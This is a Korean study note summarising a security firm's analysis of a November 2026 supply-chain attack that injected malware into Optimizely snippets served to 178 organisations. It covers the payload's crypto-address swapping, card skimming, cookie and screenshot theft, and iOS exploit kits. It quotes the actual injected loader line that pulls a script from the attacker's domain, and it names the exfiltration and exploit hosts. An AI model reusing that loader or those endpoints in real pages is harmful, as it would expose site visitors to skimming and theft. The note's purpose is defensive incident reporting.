---
title: "Optimizely 공급망 공격: Zoom·GitLab·BBC 등 178개 조직 악성코드 감염 사건 전말"
tags: [dev-digest, hot, javascript]
type: study
tech:
  - javascript
level: ""
created: 2026-11-17
aliases: []
---

> [!info] 원문
> [Optimizely compromised, served malware on Zoom, GitLab](https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/) · Hacker News (Top)

## 핵심 개념

> [!abstract]
> 2026년 11월 16일, A/B 테스트 플랫폼 Optimizely의 Project JavaScript 필드를 통해 Zoom, BBC, CNN, GitLab, HSBC, Ledger 등 178개 조직에 악성 스크립트가 유포됐습니다. 이 스크립트는 암호화폐 지갑 주소 치환, 카드 스키밍, 쿠키·스크린샷 탈취는 물론 iOS 기기 대상 익스플로잇 킷까지 전달하는 복합 공격 도구였습니다. 발견 당시 이미 약 $7,040 상당의 암호화폐가 탈취된 상태였고, Report URI는 CSP enforcement 모드와 서드파티 스크립트 모니터링의 중요성을 강조합니다.

## 아티클

# Optimizely 공급망 공격, Zoom·GitLab·BBC까지 178개 조직에 악성코드 유포

2026년 11월 16일, 웹 A/B 테스트 플랫폼 Optimizely를 통해 전 세계 178개 조직의 방문자들에게 악성 JavaScript가 배포되는 사건이 발생했습니다. Zoom, BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger, Peacock 등 세계에서 가장 많이 방문되는 사이트들이 명단에 올랐습니다. 이 글은 CSP·보안 모니터링 서비스 Report URI가 이 공급망 공격을 탐지하고 분석한 내용을 정리한 것입니다. 신뢰된 서드파티 스크립트가 어떻게 공격 경로가 될 수 있는지, 그리고 왜 "신뢰할 수 있던 JavaScript"도 영원히 신뢰할 수 없는지를 보여주는 사례입니다.

## 무슨 일이 있었나

Optimizely Web은 고객사마다 Optimizely CDN에서 JavaScript "스니펫"을 로드하는 방식으로 동작합니다. 예를 들면 `https://cdn.optimizely.com/js/6395285578973184.js` 같은 URL입니다. 이 스니펫 안에는 Optimizely의 자체 코드, 고객사가 설정한 실험(experiment) 코드, 그리고 선택적으로 "Project JavaScript(projectJS)"라는 필드가 들어있습니다. projectJS는 고객이 Optimizely 대시보드에서 직접 작성해 모든 페이지에서 실행되도록 하는 커스텀 코드입니다.

공격자는 바로 이 Project JavaScript 필드에 자신의 코드를 주입했습니다. 스니펫의 나머지 부분은 건드리지 않았고, 파일은 여전히 `cdn.optimizely.com`에서 Optimizely의 정상 인증서로 서빙되었습니다. 즉 모든 피해 사이트가 이미 신뢰하고 있던 호스트에서 악성코드가 전달된 것입니다. Zoom의 스니펫에 삽입된 코드는 다음과 같았습니다.

```js
"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();
```

삽입된 로더는 세 가지 버전으로 관찰되었습니다.

1. `https://1688360.cc/track.js`를 가리키는 평범한 `<script>` 태그 (대부분의 스니펫)
2. 동일한 URL을 `atob()`로 base64 인코딩해 숨긴 버전. "1688360.cc"로 검색해도 찾을 수 없습니다. Smartsheet의 스니펫은 한 차례 정리됐다가 이 버전으로 다시 감염되었는데, 이는 공격자가 그 시점에도 여전히 접근 권한을 가지고 있었다는 뜻입니다.
3. 전체 페이로드를 인라인으로 포함하고, `1688360.cc`가 차단될 경우 `eval`로 실행하는 버전

일부 고객사는 스니펫을 자체 도메인(`opt.scheels.com/js/<id>.js`, `www.vodafone.com.au/js/<id>.js` 등)에서 서빙했는데, 같은 Optimizely 프로젝트의 콘텐츠를 쓰기 때문에 이들 역시 피해를 입었습니다.

공격자가 어떻게 이렇게 많은 무관한 고객 프로젝트에 쓰기 권한을 얻었는지는 밝혀지지 않았습니다. Optimizely 시스템 자체가 침해되었는지, 교차 고객 권한을 가진 인증 정보가 탈취되었는지는 Optimizely 측의 설명이 필요한 부분입니다. 다만 Optimizely의 CDN은 전달받은 것을 그대로 서빙했을 뿐이며, 이는 CDN 캐시 포이즈닝 공격이 아니라는 점은 분명합니다. 흥미롭게도 Optimizely 자체 사이트(`www.optimizely.com`, `login.optimizely.com`)의 스니펫에도 악성코드가 포함되어 있었습니다.

## 타임라인

공격은 하루 안에 매우 빠르게 전개됐습니다 (모든 시각은 UTC 기준).

| 시각 | 사건 |
|---|---|
| 9월 17일 | 동일 공격자의 인젝터 webshell.lol이 터키 사이트의 SEO "백링크 패널" 스크립트를 통해 처음 등장 |
| 11월 9일 17:52 | iOS 익스플로잇 킷 라우터용 도메인 5vobauua3ojpklx.icu 등록 |
| 11월 13~16일 | Kissmetrics, StorifyMe, Minute Media 스크립트를 통한 초기 공격 웨이브 (securitybank.com, faz.net, smh.com.au, vidaxl, foxsports.com 등) |
| 11월 16일 02:21 | BBC Optimizely 스니펫의 마지막 정상 urlscan 캡처 |
| 04:21 | 첫 Optimizely 감염 포착 (BBC 스니펫이 webshell.lol 로드) |
| 04:28~05:23 | 1688360.cc 인증서 발급; 05:23 도메인 등록 |
| 08:10 | track.js(크립토 클리퍼) 첫 빌드 |
| 08:28 | bbc.com에서 1688360.cc/track.js 최초 포착 |
| 11:20 | Zoom 스니펫 수정(Last-Modified 헤더 기준) |
| 13:03 | 공격자가 탈취한 크립토를 거래소로 이체 |
| 13:43 | track.js에 카드 스키머 추가 |
| 16:38 | 두 번째 iOS 라우터 도메인 eil786npto9u5bq.icu 등록 |
| 17:13~17:57 | 두 번째 iOS 호스트 추가, iOS 18.6 이하 모든 방문에 Coruna iframe 주입 |
| 19:24~19:59 | Report URI 조사: 1,611개 스니펫 중 186개 감염 |
| 20:40~21:10 | 대규모 정리 작업 (Ledger 20:41, Smartsheet 20:56, BBC 21:07) |
| 21:52 | 188개 중 1개(TalkTalk)만 여전히 감염 상태 |

페이로드는 하루 동안 26번 재빌드되었습니다. 공격자는 기능을 추가하고 지갑 주소를 추가했을 뿐, 기존 것을 제거한 적은 없었습니다.

## 페이로드가 하는 일

모든 방문자는 동일한 스크립트 track.js를 받았고, 모든 기능이 동시에 활성화되어 있었습니다. 실제로 어떤 피해를 입었는지는 방문자의 기기와 페이지에서의 행동에 따라 달랐습니다.

### 1. 크립토 지갑 주소 치환 (이미 자금 탈취 발생)

스크립트는 유효한 지갑 주소(BTC, ETH 및 EVM 계열, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin)를 찾아 공격자의 주소로 바꿔치기합니다. 체크섬을 검증하기 때문에 실제 유효한 주소만 교체합니다. 교체 대상은 다음과 같습니다.

- 페이지 텍스트, 폼 필드, 링크, 이미지
- 클립보드 (복사 시 및 `navigator.clipboard`를 통한 접근)
- 아웃바운드 fetch/XHR 요청, `window.open`, 내비게이션, iOS 공유 시트

페이지가 변경될 때마다 다시 스캔하기 때문에, 감염된 페이지에서 주소를 복사하면 (혹은 해당 탭이 열려있는 동안 다른 곳에서 복사해도) 공격자의 주소가 붙여넣기 될 수 있습니다.

### 2. 카드 스키밍

13:43 UTC에 추가된 기능입니다. 스크립트는 폼 제출과 모든 fetch/XHR POST 요청을 감시하면서 카드 번호(Luhn 체크 적용), 유효기간, CVV를 찾습니다. 세 가지 정보가 모두 확보되면 `navigator.sendBeacon`을 통해 `https://1688360.cc/card.php`로 전송합니다. Stripe, Adyen 같은 호스팅 결제 iframe에 입력된 카드 정보는 접근 범위 밖이었지만, 사이트 자체 폼 필드에 입력된 카드 정보는 그대로 탈취 대상이었습니다.

### 3. 쿠키 및 스크린샷 탈취

지갑/결제 관련 문구 근처에서 주소를 치환할 때, 다음 정보를 `https://1688360.cc/hit.php`로 전송합니다.

- 페이지 URL
- `document.cookie` (HttpOnly로 설정되지 않은 쿠키)
- 치환하기 전 원래 주소
- html2canvas로 렌더링한 페이지 스크린샷

### 4. iOS 익스플로잇 킷: Coruna와 DarkSword

iPhone과 iPad에서는 스크립트가 `5vobauua3ojpklx.icu`와 `eil786npto9u5bq.icu`에서 boot.js를 로드합니다. iOS 버전을 읽어 숨겨진 iframe에서 익스플로잇 체인을 실행합니다.

| iOS 버전 | 체인 |
|---|---|
| 13 ~ 17 | Coruna (/A8/, 그리고 /JIUJIU888/index.js에 직접 Coruna 로더) |
| 18.x | DarkSword (/B9/, /D11/, /D12/) |
| 26 | 별도 체인(/C10/); 현재는 기기 핑거프린팅만 수행 |

Coruna 로더는 Report URI가 10월에 다른 캠페인에서 분석했던 샘플과 바이트 단위로 동일했습니다. 킷 자체 주석에는 iOS 18.7.3 이상, 26.3 이상 버전은 패치되어 있다고 적혀 있습니다. iOS 18.6 이하 기기에서는 페이지가 60초마다 리로드되며 익스플로잇을 재시도하는데, 이것이 눈에 띄는 증상입니다.

## 지금까지 탈취된 금액

11월 16일 19:25 UTC 기준, 공격자 지갑에는 약 9시간 만에 약 $7,040 상당이 입금됐습니다.

| 지갑 | 수령액 | 대략 USD |
|---|---|---|
| BTC 19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW | 0.08298 BTC (4건, 미사용) | $5,380 |
| LTC ltc1q3wp7g6ds0ggg6fl6kncpa4sepn0q3qfacgred5 | 17.02 LTC (3건) | $762 |
| TRON THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa | 662.9 USDT + 184 TRX | $719 |
| ETH 0xC4026b06D82b0F0B363eda0642D61CfbDc17884e | 0.055 ETH | $100 |
| BSC (동일 0x 주소) | 82 USDT | $82 |

자금은 13:03~13:05 UTC에 거래소로 이체되었고, 이더리움 상의 USDC는 HitBTC 입금 주소로 흘러갔습니다. TRON 지갑은 2026년 3월부터 사용되어 온 것으로 확인되어, 이 공격자가 이번 캠페인 이전부터 활동해왔다는 것을 알 수 있습니다. 얼마나 많은 카드 정보와 쿠키가 1688360.cc로 전송되었는지는 확인할 수 없는 상태입니다.

## 피해 규모와 분야

Report URI는 자체 크롤링 데이터를 기반으로 1,611개의 서로 다른 Optimizely 스니펫을 수집해 각각 악성코드 포함 여부를 검사했습니다. 그 결과 178개 조직, 188개 스니펫이 감염된 것으로 확인되었으며, 시간 내에 발견할 수 있었던 스니펫만 대상으로 했기 때문에 실제 피해 규모는 더 클 가능성이 있습니다. 증거로 감염된 모든 파일의 사본, 응답 헤더, SHA-256 해시, 수집 시각을 보관했습니다.

분야별로 보면 금융·은행 분야가 32개 조직(Paychex, HSBC 미국, Equifax, SmartAsset, HSBC 홍콩 등)으로 가장 많았고, 기술·SaaS 분야가 23개 조직(Zoom, Bitly, Salesforce, GitLab, Optimizely 자체 포함)으로 뒤를 이었습니다. 이 외에도 리테일·패션(20), 스트리밍·엔터테인먼트(12, Peacock·Wizards of the Coast 등), 뉴스·미디어(10, CNN·BBC·Fox News·NPR 등), 항공·여행(9, Air France-KLM·KLM 네덜란드 등), 헬스케어·제약(8), 산업·제조(8), 통신(7, Virgin Media·Vodafone 등), 암호화폐·트레이딩(6, Ledger·IG 등), 보험(6), 부동산(6), 식품·호스피탈리티(5), 스마트홈(5, Resideo·Honeywell Home 등), 비영리·시민단체(4), 도박(4), 전문 서비스(4), 물류(3), 자동차(3, Lucid Motors 등), 교육(3) 분야에서도 조직들이 피해를 입었습니다. 21:52 UTC 기준으로는 TalkTalk를 제외한 모든 스니펫이 정리된 상태였습니다.

## Report URI가 강조하는 교훈

Report URI는 자사 플랫폼이 바로 이런 유형의 공격을 탐지하도록 설계되었다는 점을 강조합니다. 신뢰된 JavaScript에 발생한 예기치 않은 변경, 새로운 스크립트 로드, 외부 목적지로의 의심스러운 연결을 감지할 수 있기 때문에, 원본 스크립트가 신뢰된 Optimizely 도메인에서 서빙되고 있었음에도 악성 활동을 노출시킬 수 있었을 것이라고 설명합니다. 적절한 enforcement 모드의 CSP(Content Security Policy)가 적용되어 있었다면, 공격 성공 전에 핵심 공격 경로를 차단하는 것도 가능했을 것이라고 덧붙입니다.

이 사건이 주는 핵심 교훈은, 신뢰할 수 있던 JavaScript가 언제까지나 신뢰할 수 있는 것은 아니라는 점입니다. 웹사이트 자체의 코드나 인프라가 침해되지 않더라도, 서드파티 의존성을 통해 얼마든지 공격당할 수 있습니다.

## 정리

- Optimizely Web의 Project JavaScript 필드를 통해 공격자가 178개 조직, 188개 스니펫에 악성코드를 주입했으며, 스크립트는 여전히 신뢰된 `cdn.optimizely.com`에서 정상 인증서로 서빙되었습니다.
- 페이로드(track.js)는 암호화폐 지갑 주소 치환, 카드 스키밍, 쿠키·스크린샷 탈취, iOS 기기 대상 Coruna/DarkSword 익스플로잇 킷 배포까지 포함한 복합 공격 도구였으며 하루 동안 26차례 업데이트됐습니다.
- 발견 시점까지 약 $7,040 상당의 암호화폐가 이미 탈취되어 거래소로 이체되었고, 카드·쿠키 정보가 얼마나 유출됐는지는 파악되지 않았습니다.
- 공격자가 어떻게 다수의 무관한 고객 프로젝트에 쓰기 권한을 획득했는지는 아직 불명확하며, Optimizely 측의 추가 설명이 필요합니다.
- 서드파티 스크립트를 신뢰 기반으로만 운영하는 것은 위험하며, CSP를 enforcement 모드로 적용하고 신뢰된 스크립트의 변경·신규 로드·의심스러운 외부 연결을 지속적으로 모니터링하는 체계가 필요하다는 점을 실무자들에게 다시 한번 환기시키는 사건입니다.

## 참고 자료

- [원문 링크](https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/)
- via Hacker News (Top)
- engagement: 187

## 관련 노트

- [[2026-11-17|2026-11-17 Dev Digest]]
